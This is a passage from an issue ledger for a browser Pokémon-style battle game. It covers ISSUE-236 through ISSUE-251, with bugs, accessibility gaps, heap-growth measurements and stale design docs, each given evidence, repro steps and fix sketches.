//   Gardenia, Gordie, Grant, Grusha, Iono, Jasmine, Kabu, Katy, Kofu, Korrina, Lenora,
//   Maylene, Melony, Milo, Morty, Nessa, Norman, Olympia, Opal, Piers, Pryce, Raihan,
//   Ramos, Roark, Roxanne, Ryme, Skyla, Tate, Tulip, Valerie, Viola, Volkner, Wattson,
//   Whitney, Winona, Wulfric (56 leaders)
// These all have LEADER_VICTORY_LINES (post-battle) and LEADER_BADGE_REFLECTIONS, but
// no pre-battle voice — they're just "Show me what you've trained for."
```

**Repro**: Story run, reach Falkner / Roark / Wattson / Raihan as your gym leader (any non-Kanto first-gen leader). Compare the intro line — it'll be the same generic 6-line pool for every one of them.

**Blast radius**: Cosmetic — the moment-to-moment "fanservice" of a recognisable gym leader is missed. Battle still functions. Same problem the prior audit flagged for Champion victory; the gym intro layer was never extended the same way.

**Fix sketch**: Add 2-3 lines per missing leader to `TRAINER_QUOTES_BY_NAME`, matching the existing tone (one-liner Game Boy-style boasts). The 8 Kanto leaders are the template. ~150 lines of text data.

**Verification**: Manual — start a story run, fight each of the 8 cities' gym leader, eyeball that the intro line reflects the trainer's personality (e.g. Raihan = social media banter, Allister = quiet ghost flavor).

---

## <a id="ISSUE-236"></a> ISSUE-236: Trick / Switcheroo swap is one-directional — the user's item is destroyed

---
id: ISSUE-236
severity: P2
category: bug
anchor_symbol: Trick
current_line_hint: ~27635
file: battle.html
agents: [test-coverage-filler]
fingerprint: f5fbfd6fa9b5
confidence: high
status: open
---

**Title**: Trick / Switcheroo swap is one-directional — the user's item is destroyed

**Evidence**:
```js
// battle.html:27635 — the swap line itself LOOKS correct:
let temp = attacker.item; attacker.item = defender.item; defender.item = temp;
// ...yet observed behavior is one-directional (likely a post-swap overwrite / reference issue).
```

**Repro**: jsdom harness, instrumented (pActive===a, fActive===d confirmed). Mew holding Iron Ball uses Trick on Snorlax holding Oran Berry:
BEFORE a.item=Iron Ball d.item=Oran Berry → AFTER a.item=Oran Berry d.item=Oran Berry.
The user receives the foe's item, but the foe keeps its own; the user's Iron Ball is gone. Reproduces for Switcheroo and across item pairs (Iron Ball/Oran, Oran/Lum).

**Blast radius**: A foe (or player) using Trick/Switcheroo loses its item for nothing and fails to saddle the target (e.g., a Choice/Iron Ball trickster does nothing to the opponent). Item economy bug.

**Fix sketch**: The literal swap at 27635 is correct, so trace what re-reads/overwrites `defender.item` after the handler returns (end-of-turn item normalization or an AI mon re-deriving its build item). Add a deterministic test asserting both sides swap.

**Verification**: After Trick, attacker.item === foe's old item AND defender.item === user's old item (see tests/moves/by-category/_drafts — Trick is currently deferred for this reason).

---

## <a id="ISSUE-237"></a> ISSUE-237: Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing

---
id: ISSUE-237
severity: P2
category: a11y
anchor_symbol: type-badge
current_line_hint: ~14906
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 2c0ca902ef08
confidence: high
status: open
---

**Title**: Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing

**Evidence**:
```js
// getTypeHTML at ~14906
let html = `<span class="type-badge type-${t1}" onmousemove="window.showTypeTooltip('${t1}', event)" onmouseleave="window.hideTextTooltip()" style="cursor:help;">${t1}</span>`;

// Battle-log move link at ~12958
return `used <span class="log-move-link tip-move-cell" data-mn="${enc}" onclick="…showMoveTooltipTap(…)" onmousemove="…showMoveTooltip(…)" onmouseleave="…">${moveName}</span>!`;
```

The defensive/offensive type chart, raw move stats (BP/Acc/PP/effect), and inline tip-term glossary are *only* surfaced via tooltip. The triggers are `onmousemove` + `onclick` — there is no `onfocus`/`onblur` pair, so keyboard users tabbing through battle log spans get no tooltip even if the element is focusable. Touch users hit the `onclick` "tap mode" branch (good) but only on terms that have an `onclick` handler; many decorative type badges (`getTypeHTML` above) lack one entirely.

**Repro**: Tab to a "burned" / "leech-seeded" status word in the battle log → nothing. Press Enter on a type badge in the foe's stat box → nothing.

**Blast radius**: Type chart is critical learning content. Hover-only delivery makes it inaccessible to keyboard, touch on decorative badges, and many SR users.

**Fix sketch**: For each tooltip helper, mirror `onmousemove` with `onfocus` (using the same handler) and `onmouseleave` with `onblur`. Add `tabindex="0"` + `role="button"` to type badges and tip-term spans that don't already have them. The existing `showFieldTooltipFromData` at line 16034 already uses both `onclick` and `onkeydown` — replicate that pattern globally.

**Verification**: Tab to a type badge → tooltip shows on focus; type chart announces via SR.

---

## <a id="ISSUE-238"></a> ISSUE-238: Long story replay shows steady, non-plateauing heap growth (~22–67 KB/turn, R²=0.99 over 250 battles) driven by per-turn / per-distinct-foe DOM scaffolding that GC + reset() do not reclaim

---
id: ISSUE-238
severity: P2
category: perf
anchor_symbol: updateBattleUI
current_line_hint: 16788
file: battle.html
agents: [performance-profiler]
fingerprint: 3e3792c97f56
confidence: medium
status: open
---

**Title**: Long story replay shows steady, non-plateauing heap growth (~22–67 KB/turn, R²=0.99 over 250 battles) driven by per-turn / per-distinct-foe DOM scaffolding that GC + reset() do not reclaim

**Evidence**: Full story-style replay (roll fresh team + build foes + run turns per battle), jsdom with `--expose-gc`:
```
68 battles  / 408 turns:  heap 85.7 -> 112.2 MB  (+26.5 MB, ~67 KB/turn, ~399 KB/battle)
250 battles/~1500 turns:  heap 85.7 -> 171.2 MB  (+85 MB, R²=0.995)
  first-half slope 0.362 MB/battle  ≈  second-half slope 0.335 MB/battle  (slope does NOT decay)
After loop, reset() + global.gc(): 112.2 -> 112.5 MB (NO drop → retained in detached DOM/closures, not live state)
DOM node count climbed 1210 -> 4365 over 68 battles (player-sprite-container alone: 0 -> ~1415 descendants)
```
Same-mon turn loop in isolation grows only ~22 KB/turn (matches the prior baseline) and sprite-container stays at 9 descendants — the extra growth tracks **distinct foe species** (new sprite `<img>` + per-mon UI scaffolding), not turn count alone.

**Repro**: `node --expose-gc` replay calling `__storyTest.rollTrainerTeam` → `mkMon(slot)` → `runTurn` for ~68 battles, sampling `process.memoryUsage().heapUsed` every 10 battles.

**Blast radius**: This is the headline "will it scale" signal for the redesign. It is **linear, not quadratic** (no algorithmic leak), so it is not a P1 — but it does **not plateau**, so a session spanning a full story + post-game + the planned Fight Club gauntlet (hundreds of battles) trends to hundreds of MB on the JS heap, before counting the separate `_preloadedImages` image-decoder pool. IMPORTANT HONESTY CAVEAT: a large share of the jsdom number is inflated by the harness's anime.js stub — animation-completion callbacks that normally call `el.remove()` on effect/overlay nodes never fire, and `showBattlePopup`/MoveAnimEngine are gated on `settings.animations` (false in tests), so the measured per-turn DOM retention overstates a real browser where those timers/callbacks run. The real, browser-relevant slice is the per-distinct-foe sprite/UI scaffolding + the `_preloadedImages` cache (separate finding).

**Fix sketch**: Audit the per-foe sprite/overlay creation in the battle-UI refresh (sub/protect overlays at battle.html:16788–16808 are guarded; the unbounded growth is new `<img>`/effect nodes per distinct foe). Ensure swapping a battler tears down the prior battler's sprite nodes. Re-measure in a real headless browser (Playwright) with `settings.animations` true to separate the genuine retention from the anime-stub artifact before sizing the fix.

**Verification**: In a Playwright session with animations on, run 100+ battles and confirm `document.querySelectorAll('*').length` and JS heap plateau (slope → 0) rather than climbing linearly.

---

## <a id="ISSUE-239"></a> ISSUE-239: Long story replay shows linear (non-quadratic) heap + DOM-node growth that does not plateau — ~0.275 MB and ~52 sprite-container nodes retained per battle

---
id: ISSUE-239
severity: P2
category: perf
anchor_symbol: updateBattleUI
current_line_hint: ~16854
file: battle.html
agents: [performance-profiler]
fingerprint: 3dc9c4ece2e7
confidence: medium
status: open
---

**Title**: Long story replay shows linear (non-quadratic) heap + DOM-node growth that does not plateau — ~0.275 MB and ~52 sprite-container nodes retained per battle

**Evidence**: Story-style replay (roll fresh team → build 6 foes → run a turn each), jsdom `--expose-gc`, `settings.animations=false`:
```
200 battles: heap 88.8 → 145.3 MB   slope 0.275 MB/battle   R²=0.983
  first-half slope 0.329  ≈  second-half slope 0.214  (slope does NOT increase → LINEAR, not a quadratic leak)
DOM nodes: 1168 → 11520  (+51.76 nodes/battle, dead-linear)
Top growers over 30 battles: #player-sprite-container +93, #foe-sprite-container +60, #screen-battle +13
```
The sub/protect overlays at battle.html:16854–16876 are correctly guarded (querySelector + `.remove()` on clear) so they are NOT the leak; the retained nodes are per-battle sprite/UI scaffolding in the two sprite containers that battle teardown does not reclaim.

**Repro**: `node --expose-gc` replay over 200 battles sampling `process.memoryUsage().heapUsed` + `document.querySelectorAll('*').length` every 20 battles (`/tmp/memlong.mjs`, `/tmp/domsrc.mjs` this session).

**Blast radius**: This is the "will it scale over a long session" signal. It is **linear, not quadratic**, so it is a P2 (steady drip), not a P1 (algorithmic leak). HONESTY CAVEAT: a meaningful share of the jsdom number is harness-shaped — the anime.js stub means animation-completion callbacks that normally call `el.remove()` on effect/overlay nodes never fire, and the move-effect / stat-arrow / pokéball append paths (battle.html:12599, 12627, 16066) are all gated on `settings.animations` (false in tests), so the per-battle DOM retention measured here overstates a real browser where those timers run. The browser-relevant slice (per-distinct-foe sprite scaffolding) needs a Playwright run with animations ON to size precisely.

**Fix sketch**: Audit battle teardown to ensure swapping/ending a battle removes the prior battler's appended sprite/effect nodes from `#player-sprite-container` / `#foe-sprite-container`. Re-measure in headless Chromium (Playwright) with `settings.animations=true` to separate genuine retention from the anime-stub artifact before sizing the fix.

**Verification**: In a Playwright session with animations on, run 100+ battles and confirm `document.querySelectorAll('*').length` and JS heap plateau (slope → 0) rather than climbing linearly.

---

## <a id="ISSUE-240"></a> ISSUE-240: STORY_3TRACK_IMPL_PLAN reads as a forward plan but is mostly SHIPPED — only PR-1 marked done

---
id: ISSUE-240
severity: P2
category: inconsistency
anchor_symbol: VILLAIN_STORY_BEATS
current_line_hint: ~39700
file: docs/story-design/STORY_3TRACK_IMPL_PLAN.md
agents: [spec-drift-auditor]
fingerprint: da1f12f20b3b
confidence: high
status: open
---

**Title**: STORY_3TRACK_IMPL_PLAN reads as a forward plan but is mostly SHIPPED — only PR-1 marked done

**Evidence**:
```text
STORY_3TRACK_IMPL_PLAN.md:58  PR-1 ✓ ; PR-2..PR-7 unmarked (read as pending)
  but in battle.html: MAIN/VILLAIN/EXTRA_STORY_BEATS (5+5+5 hits), STORY_SCENES,
  BOSS_CONFIGS, ANOMALY_SEEDS, STORY_REWARD_TIERS, IntroQueue, the_first ALL present
  and _tryFireRoadStoryBeats is wired into enterBattleEvent (battle.html:~42905).
```

**Repro**: `for s in MAIN_STORY_BEATS VILLAIN_STORY_BEATS EXTRA_STORY_BEATS STORY_SCENES BOSS_CONFIGS ANOMALY_SEEDS IntroQueue; do grep -cF "$s" battle.html; done` — all non-zero. The dispatcher (`_resolveActiveRoadBeats`, `_activeBattleBeatForCurrentRow`, `_playStoryBeatScene`) exists and runs. PR-5's `applyExpShareVoucher` is the one named piece NOT shipped (`grep -c applyExpShareVoucher battle.html` = 0; ledger ISSUE-277).

**Blast radius**: Because the PR checklist shows only PR-1 ✓, a reader assumes the whole 3-track system is unbuilt and may re-implement it, or skip it in the merge. In reality this is the LIVE narrative engine and should be promoted to canon (with its known bugs from STORY_FLOW_AUDIT §3). The "stays alive but defaults to classic" note about STORYLINE_VARIANTS (line 25) is now the actual shipped state, not a future intention.

**Fix sketch**: Update the PR table to mark PR-2..PR-6 shipped (note PR-3b IntroQueue partial, PR-5 Exp Share Voucher unshipped), and re-point "source of truth for content" away from the deleted CITY_BY_CITY.md / PLAYTEST_REPORT.md (lines 726/728 — see ledger 7754-7755).

**Verification**: The plan's status reflects code; no shipped subsystem is listed as pending and vice-versa.

---

## <a id="ISSUE-241"></a> ISSUE-241: EVOLUTION_FLOW_REBUILD.md header says "Status: Plan — review before implementation" but the system fully shipped

---
id: ISSUE-241
severity: P2
category: inconsistency
anchor_symbol: VOUCHER_KEYS
current_line_hint: ~46650
file: docs/EVOLUTION_FLOW_REBUILD.md
agents: [spec-drift-auditor]
fingerprint: 70efe53e89e9
confidence: high
status: open
---

**Title**: EVOLUTION_FLOW_REBUILD.md header says "Status: Plan — review before implementation" but the system fully shipped

**Evidence**:
```
docs/EVOLUTION_FLOW_REBUILD.md:3  > **Status:** Plan — review before implementation
```
Yet the plan's deliverables are all live in battle.html:
```js
// VOUCHER_KEYS (~46650) matches the doc's proposed array §3 verbatim:
const VOUCHER_KEYS = ['rareCandy','vitamin','heartScale','mint','abilityCapsule',
                      'emblemHonor','wishingPiece','linkDiscount50','stoneToken','casinoChip500'];
// STONE_SHOP_ITEMS exists; linkDiscount50/stoneToken/casinoChip500 wired; Bill/Stonewise-Granny cold-opens present.
// City0 action list no longer has 'Link Station'/'Evolution Tutor' — the doc's §2 "strict removals" were applied.
```

**Repro**: `grep -c STONE_SHOP_ITEMS battle.html` → 11; `grep -cE 'linkDiscount50|stoneToken|casinoChip500' battle.html` → 29; `grep -ciE 'Stonewise|Granny' battle.html` → present. STORY_EVENTS_RAW City0 (~30630) = `['Professor','Pokemart','Move Tutor','Leave City']` (Link Station + Evolution Tutor removed exactly as §2 specifies). The doc describes the shipped facility as if unbuilt.

**Blast radius**: A new session reading this "Plan — review before implementation" doc would conclude the Stone Shop, the 3 new vouchers, and the Bill/Granny intros are unimplemented and rebuild them — duplicate facility, duplicate `VOUCHER_KEYS` entries, conflicting City-2 gates. This is the exact "old design → wrong build" hazard the sweep targets. The doc also carries the worst anchor drift (see the stale-anchor cluster: `battle.html:27975-28043` for STORY_EVENTS_RAW, now ~30629).

**Fix sketch**: Flip the header to "Status: SHIPPED (2026-05/06)" (or move the doc to an archived/implemented section) so it reads as a record, not a backlog item. Strip or refresh the point-in-time `battle.html:LINE` anchors throughout.

**Verification**: The doc's status line reflects shipped reality; no reader would re-implement Stone Shop / vouchers from it.

---

## <a id="ISSUE-242"></a> ISSUE-242: Modals have aria-modal + Escape but no Tab focus trap — keyboard focus can leave the dialog

---
id: ISSUE-242
severity: P3
category: a11y
anchor_symbol: __pbsGlobalEscBound
current_line_hint: ~13019
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 587b740ecf41
confidence: medium
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: Modals have aria-modal + Escape but no Tab focus trap — keyboard focus can leave the dialog

**Evidence**:
```js
document.addEventListener('keydown', function (e) {
    if (e.key !== 'Escape') return;            // Escape closes topmost modal — good
    const modals = document.querySelectorAll('.modal:not(.hidden)');
    // ...no Tab-key containment anywhere...
});
```

**Repro**: Open any modal and press Tab repeatedly. `aria-modal="true"` is advisory only; without a trap, focus walks out to controls on the screen behind the overlay (which is not `inert`/`aria-hidden`), so a sighted keyboard user can operate background controls through the modal.

**Blast radius**: All `.modal` dialogs. Escape-to-close and focus-return are already handled, so this is the remaining piece of correct dialog semantics.

**Fix sketch**: On open, set the background (`#game-stage`/screens) to `inert` or `aria-hidden="true"`; or add a Tab handler that cycles focus within the dialog's focusable set. Pair with the openModal "focus into" fix.

**Verification**: Tab/Shift+Tab stay within the open dialog; background controls are unreachable until close.

---

## <a id="ISSUE-243"></a> ISSUE-243: Heal phase (+25% maxHp) can push a raid boss back ABOVE the HP threshold the player just crossed

---
id: ISSUE-243
severity: P3
category: inconsistency
anchor_symbol: _applyBossPhaseEffect
current_line_hint: ~42003
file: battle.html
agents: [battle-engine-debugger]
fingerprint: f1a46e8493d6
confidence: medium
status: open
---

**Title**: Heal phase (+25% maxHp) can push a raid boss back ABOVE the HP threshold the player just crossed

**Evidence**:
```js
case 'heal': {
    const amt = Math.floor((foeMon.maxHp || 0) * (magnitude || 0.25));
    foeMon.currentHp = Math.min(foeMon.maxHp, (foeMon.currentHp | 0) + amt);
    break;
}
```

**Repro**: `node scripts/debug/_repro/boss-edge.mjs` (EDGE 4). Real raids use `[surge@0.75, heal@0.50, immunity@0.25]`. A boss at 40% HP gets +25% maxHp on the 50% phase → 65% HP, i.e. back above the 50% bar and above the 75% surge bar already consumed. The fired-flag prevents the *heal* re-triggering, so there is no infinite stall, but the player loses ~25% of a 6.5×-HP boss's bar in one telegraphed beat (≈1.6× a normal mon's entire HP), which can feel like a wall given the 1:1 action economy of a solo boss vs a 6-mon party.

**Blast radius**: All 8 extra-track real raids (the heal phase only exists on `*.raid`, not `*.miniRaid`). Combined with the 6.5× HP this is the slog risk.

**Fix sketch**: Balance decision — either reduce heal magnitude (e.g. 10–15%), cap healed HP to just under the threshold (`Math.min(threshold*maxHp - 1, ...)`), or replace heal with a defensive buff that doesn't re-open closed thresholds. Maintainer-owned number.

**Verification**: After a heal phase, the boss HP% should stay at/under the crossed threshold (if capped) or the heal should be small enough not to undo a full phase of player progress.

---

## <a id="ISSUE-244"></a> ISSUE-244: Dual story-vs-Frontier path in `_applyStoryBuildPowerTier` is mutually exclusive and safe — legacy branch is NOT removable (in-scope MF needs it)

---
id: ISSUE-244
severity: P3
category: inconsistency
anchor_symbol: _applyStoryBuildPowerTier
current_line_hint: ~37316
file: battle.html
agents: [consistency-auditor]
fingerprint: d7ddd1ded7bb
confidence: high
status: open
---

**Title**: Dual story-vs-Frontier path in `_applyStoryBuildPowerTier` is mutually exclusive and safe — legacy branch is NOT removable (in-scope MF needs it)

**Evidence**:
```js
let _foeCity = -1;
if (storyRowIdx != null && storyRowIdx >= 0 && sm && sm.active) _foeCity = _cityIndexForStoryRow(storyRowIdx);
// city gate (new): _foeCity >= 0   → city EV/IV curve + opt gradient
// legacy tier path: _foeCity < 0   → _storyMaybeNudgeFoeEVs + _rollTieredIVs + full move-strip
if (_foeCity < 0) { _storyMaybeNudgeFoeEVs(...); } else { _distributeEVsToTotal(...); }
```

**Repro**: Read ~37316-37418. The new (city-gate) and legacy (tier) paths branch on `_foeCity` for EVs (37377), IVs (37393), nature/ability/move opt (37401), and the move-strip (37353 `skipMoveStrip: _foeCity >= 0`). The two are mutually exclusive per-slot; there is NO path where both apply to the same mon. `_cityIndexForStoryRow` returns -1 only when the row id is absent from `STORY_EVENTS_RAW` — never for an in-order, in-scope story row — so a real story foe cannot be silently diverted into the legacy branch.

**Blast radius**: This addresses the orchestrator's lead-4 hypothesis. Verdict: the legacy `_foeCity < 0` branch is NOT a candidate for removal even though the obvious consumer is out-of-scope Frontier. The IN-SCOPE post-HoF Mystery Figure deliberately routes through it (`_applyStoryBuildPowerTier(..., 'Mystery Figure', null)` at ~38222 → storyRowIdx null → _foeCity -1; also the rematch call at ~44992 passes -1). Deleting the legacy branch would regress the post-HoF MF build path.

**Fix sketch**: No removal. Optional clarity only: the comments repeatedly call `_foeCity < 0` "Frontier / generator," but it also covers the in-scope post-HoF MF — tighten the comments to say "Frontier / generator / post-HoF MF" so a future reader doesn't delete the branch as out-of-scope. No behavior change; no diff approval needed for a comment-only edit.

**Verification**: Confirm post-HoF MF battle still builds a team (story-playthrough harness through HoF); confirm `_cityIndexForStoryRow` returns a valid 0-8 index for every shipped gym/rival/E4 row.

---

## <a id="ISSUE-245"></a> ISSUE-245: Lead→city mapping duplicated (`_BOSS_LEAD_CITIES` const vs inline `_leadCity` literal)

---
id: ISSUE-245
severity: P3
category: inconsistency
anchor_symbol: _BOSS_LEAD_CITIES
current_line_hint: ~48431
file: battle.html
agents: [story-mode-investigator]
fingerprint: 62f1b4b5cef8
confidence: high
status: open
---

**Title**: Lead→city mapping duplicated (`_BOSS_LEAD_CITIES` const vs inline `_leadCity` literal)

**Evidence**:
```js
const _BOSS_LEAD_CITIES = { 2: 'ledger', 5: 'recording', 8: 'key' };   // line ~48431
...
// inside _bossArcRenderSection hubMode branch (~48570):
const _leadCity = { ledger: 2, recording: 5, key: 8 };   // inverse map, re-declared inline
```
Two sources of truth for the same ledger/recording/key ↔ city-2/5/8 mapping. A future timeline shuffle that moves a lead to a different city must be edited in two places or the hub labels desync from the actual local-lead gating.

**Repro**: Static — grep both literals.

**Blast radius**: Boss-arc lead UI labels. Low severity (lore-only city numbers), but a latent inconsistency trap.

**Fix sketch**: Derive `_leadCity` by inverting `_BOSS_LEAD_CITIES` once (e.g. build an inverse map next to the const), or read city numbers from the single const in the render.

**Verification**: Changing `_BOSS_LEAD_CITIES` updates both the local-lead gating and the hub button labels.

---

## <a id="ISSUE-246"></a> ISSUE-246: Caged God uses three names for one entity (Specimen 0001 / Subject Zero / Subject 0001) without a stated rule

---
id: ISSUE-246
severity: P3
category: inconsistency
anchor_symbol: _bossArcCheckCageUnlock
current_line_hint: ~48507
file: battle.html
agents: [consistency-auditor]
fingerprint: 369bf4e2180e
confidence: medium
status: fixed-claude/cagedgod-excision
---

**Title**: Caged God uses three names for one entity (Specimen 0001 / Subject Zero / Subject 0001) without a stated rule

**Evidence**:
```js
// Cage-unlock alert + cage button fallback name:
const bossName = (sm.bossArc.boss && sm.bossArc.boss.name) ? sm.bossArc.boss.name : 'Specimen 0001';
// Post-catch nickname (~49814):
caught.nickname = 'Subject Zero';
// 'static' variant lead (~48475) introduces a THIRD form:
'... SPECIMEN ???? / SUBJECT 0001 / LOOP COUNT: ??? ...'
```

**Repro**: Read the Caged God flow end-to-end: brokers and the first-clear alert call it "Specimen 0001" (lore designation); the caught Pokémon is nicknamed "Subject Zero"; the `static` variant blends them into "Subject 0001". The cage button shows the rolled species name (e.g. "Mewtwo") in normal play, falling back to "Specimen 0001" only if the roll failed.

**Blast radius**: Copy only. The intent is plausibly deliberate ("Specimen 0001" = file/lore label, "Subject Zero" = the nickname you give it on capture), and the `static` glitch-corruption is in-character. But the rule is implicit; a player who hits the fallback path sees "Specimen 0001" in the button/alert but "Subject Zero" in their party — looks like two different captures.

**Fix sketch**: Document the naming rule in a comment near `_BOSS_LEAD_FLAVOR` (lore = "Specimen 0001", nickname = "Subject Zero"), and either rename the fallback boss name to "Subject Zero" to match the post-catch nickname or accept the lore label intentionally. Story copy is pasteur-owned — confirm intent before any change.

**Verification**: Trace every Caged-God string; confirm each "Specimen 0001"/"Subject Zero"/"Subject 0001" occurrence is justified by the documented rule.

---

## <a id="ISSUE-247"></a> ISSUE-247: _bossArcRenderSection rebuilt in full inside every _renderCrucible re-render (adds ~6ms of the 30ms)

---
id: ISSUE-247
severity: P3
category: perf
anchor_symbol: _bossArcRenderSection
current_line_hint: ~48539
file: battle.html
agents: [performance-profiler]
fingerprint: ece351f805e0
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: _bossArcRenderSection rebuilt in full inside every _renderCrucible re-render (adds ~6ms of the 30ms)

**Evidence**:
```js
// Inside _renderCrucible():
const cagedGodHtml = _bossArcRenderSection(true);   // builds the whole Caged-God tracker string
// _bossArcRenderSection concatenates the tracker panel + 3 lead-status rows + collect buttons
// every time, even when the trigger was an unrelated state change (e.g. Hard-Mode checkbox).
let html = '';
html += `<div ...The Caged God...>`;
html += `<div ...Broker Leads ${collectedCount}/3...>`;   // rebuilt each render
```

**Repro**: `node /tmp/perf-ext.mjs` — `_renderCrucible` with bossArc available = **30.4ms median**; with `sm.bossArc.available=false` (Caged-God section skipped) = **24.4ms median**. The Caged-God section accounts for ~**6ms** of the per-render cost and is rebuilt on every Crucible re-render including Hard-Mode toggles that don't touch the boss arc.

**Blast radius**: Coupled to the `_renderCrucible` hotspot above — same call sites. Once the boss arc is `available`, this ~6ms is paid on every hub interaction until the arc is cleared.

**Fix sketch**: Same remedy as the parent finding — extract the Caged-God tracker into its own container updated only when a lead is collected (`bossCollectLead`), not on every `_renderCrucible`. Memoize the produced string keyed on `(ledger,recording,key,cleared)` since it only changes on those 4 booleans.

**Verification**: After splitting, toggling Hard Mode should not re-invoke `_bossArcRenderSection`; bench the toggle path and confirm the ~6ms delta is gone.

---

## <a id="ISSUE-248"></a> ISSUE-248: Non-hub Caged God render path is effectively dead post-HoF (player can never be at City 2/5/8)

---
id: ISSUE-248
severity: P3
category: design
anchor_symbol: _bossArcRenderSection
current_line_hint: ~48579
file: battle.html
agents: [story-mode-investigator]
fingerprint: 90bad6000f2f
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Non-hub Caged God render path is effectively dead post-HoF (player can never be at City 2/5/8)

**Evidence**:
```js
} else if (localLeadKey && L[localLeadKey]) {
    html += `<div ...>Lead collected.</div>`;
} else if (!allLeads) {
    html += `<div ...>No lead here. Try City 2, 5, or 8.</div>`;
}
```
The non-hub branch (hubMode falsy, from a real city's PC Underground tab) keys the offered lead on `cityIndexFromEventIndex(sm.eventIndex)`. But the boss arc only becomes available post-HoF, and post-HoF the player is parked at the last visited city (City 9 region) with no backward city travel — exactly the reachability gap the maintainer surfaced the Crucible hub path to fix. So this branch only ever renders "No lead here. Try City 2, 5, or 8.", which is misleading (you literally cannot travel there).

**Repro**: Post-HoF, open any city's Pokémon Center → Underground tab. Always shows "No lead here."

**Blast radius**: Player confusion + dead code. The branch was written for an intra-run collection model that the post-game-only gating made unreachable.

**Fix sketch**: Either (a) drop the non-hub branch entirely and only render the Caged God in the Crucible (single source), or (b) if the maintainer ever wants intra-run lead collection, the boss arc would need to be available pre-HoF — a larger design change. Pairs with the Crucible-double-render finding (suppress when `sm.atCrucible`).

**Verification**: No "No lead here. Try City 2, 5, or 8." dead text is reachable in normal post-HoF flow.

---

## <a id="ISSUE-249"></a> ISSUE-249: Entire Caged God boss-arc subsystem is dead code after v24 removal

---
id: ISSUE-249
severity: P3
category: refactor
anchor_symbol: _bossArcRenderSection
current_line_hint: ~49490
file: battle.html
agents: [story-mode-investigator]
fingerprint: 54819c046cee
confidence: high
status: open
---

**Title**: Entire Caged God boss-arc subsystem is dead code after v24 removal

**Evidence**:
```js
function _bossArcRenderSection(hubMode) {
    _bossArcEnsureState();
    if (!sm.bossArc.available || sm.bossArc.cleared) return '';
```

The v24 cut removed the boss arc from the design (STORY_MODE_FLOW.md §9) and `migrateStoryPreV24` strips `sm.bossArc`, but the implementation is fully retained and wired into live render paths that can never activate: `_bossArcRenderSection` (called at ~48819 and ~49039), `_bossArcEnsureState`, `_bossArcCheckCageUnlock`, `_bossArcRollLegendary`, the `bossMode` branch of `_catchHandleSuccess` (~50953, grants "Subject Zero" + a 10,000G/vitamin bundle), and the 8 per-variant "Subject Zero is yours" epilogue strings (~32996). All are unreachable because `sm.bossArc.available` is never set true (see the related P0). This is large dead surface that confuses future audits and risks accidental reactivation.

**Repro**: `grep -n "bossArc\|Subject Zero\|caged" battle.html` shows ~30 live references; none are reachable in normal play.

**Blast radius**: Maintenance / audit clarity; carries an unreachable gold+item reward path that would be exploitable if the gate were ever re-truthed.

**Fix sketch**: Remove the boss-arc functions, the bossMode catch branch, the Subject Zero epilogues, and the render-call sites — or, if kept for a future feature, fence them behind an explicit `STORY_BOSS_ARC_ENABLED` flag defaulting false and annotate as parked.

**Verification**: `grep -c "bossArc" battle.html` drops to the migration-strip only; no render path references it.

---

## <a id="ISSUE-250"></a> ISSUE-250: Solo-raid HP is 6.5× base, not the documented (maxParty-1)=5× — stat-mult and HP-scale compound on HP

---
id: ISSUE-250
severity: P3
category: inconsistency
anchor_symbol: _bossHpScaleForKind
current_line_hint: ~14886
file: battle.html
agents: [battle-engine-debugger]
fingerprint: df924face4ff
confidence: high
status: open
---

**Title**: Solo-raid HP is 6.5× base, not the documented (maxParty-1)=5× — stat-mult and HP-scale compound on HP

**Evidence**:
```js
// buildPokemon: _bossStatMult (1.3) multiplies maxHp...
mon.maxHp = Math.max(1, Math.floor(mon.maxHp * bm));     // ×1.3
// ...then _bossHpScale (5) multiplies the ALREADY-boosted maxHp
mon.maxHp = Math.max(1, Math.floor(mon.maxHp * build._bossHpScale)); // ×5  => net ×6.5
```

**Repro**: `node scripts/debug/_repro/raid-balance.mjs`. Mewtwo raid: plain HP 182 → 1180 (×6.5), atk 103→133, spa 206→267, spe 200→260. Comment at ~41912 states "real boss = (maxParty - 1) × base HP" (=5× for a 6-mon party); the shipped value is 6.5×. The boss-mechanics test (`story-boss-mechanics-v22.test.js:183`) explicitly asserts the compounding, so the *code* is internally consistent — the **doc/design intent** is what's stale.

**Blast radius**: All 8 extra-track solo raids (Marowak/Yamask/Hypno/Trevenant/Mimikyu/Drifblim/Parasect/Mewtwo), raid + miniRaid. This is the core balance question (below).

**Fix sketch**: Decide intent. If 5× is the target, apply `_bossHpScale` to the *base* maxHp before `_bossStatMult`, or exclude HP from `_bossStatMult` for boss builds. If 6.5× is intended, fix the comment + the design note in CSV prose. This is a balance-number decision — maintainer-owned.

**Verification**: raid-balance.mjs HP ratio should match whichever target is chosen; update the test's expected formula accordingly.

---

## <a id="ISSUE-251"></a> ISSUE-251: CONFIRMED CLEAN — PC overflow at party-cap + 30/30 shows explicit message; sell/release path exists

---
id: ISSUE-251
severity: P3
category: bug
anchor_symbol: _catchHandleSuccess
current_line_hint: ~44937
file: battle.html
agents: [story-mode-investigator]
fingerprint: 676d6b1d9871
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — PC overflow at party-cap + 30/30 shows explicit message; sell/release path exists

**Evidence**:
```js
const maxParty = _storyMaxPartySize();
const partyFull = (sm.team||[]).length >= maxParty;
const pcFull = (sm.pcBox||[]).length >= PC_BOX_CAP;
if (partyFull && pcFull) {
    _catchFinishWithMessage(`Your party (${(sm.team||[]).length}/${maxParty}) and PC (${PC_BOX_CAP}/${PC_BOX_CAP}) are full. Free a slot at the Pokémon Center, then try again.`);
    return;
}
```

**Repro**: `_catchHandleSuccess` (44937) handles party-full+PC-full with an explicit modal directing the player to the Center. Party-full + PC-room offers a swap prompt (`_renderPartySwapPrompt`, 44968). The Center's Underground tab (`pcSell`) and PC `pcRelease` both free slots. Spec §7 satisfied (modulo the help text saying "10/10" — see separate finding).

**Blast radius**: Tier-1 #5 — clean.

**Fix sketch**: None — positive confirmation.

**Verification**: Fill party to cap + PC to 30; throw a successful catch; confirm the modal and that a release/sell then allows the catch.

---

